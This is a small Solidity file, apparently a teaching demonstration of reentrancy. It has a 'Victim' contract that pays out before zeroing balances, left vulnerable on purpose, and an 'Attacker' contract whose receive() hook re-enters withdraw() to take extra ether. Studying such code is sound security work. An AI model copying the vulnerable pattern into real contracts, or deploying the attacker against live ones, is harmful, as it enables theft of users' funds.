// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Victim {
    mapping(address => uint) private balances;

    function withdraw() public {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract Attacker {
    Victim victim;
    uint256 private initialDeposit;

    constructor(address _vulnerable) {
        victim = Victim(_vulnerable);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > initialDeposit) {
            victim.withdraw();
        }
    }
}
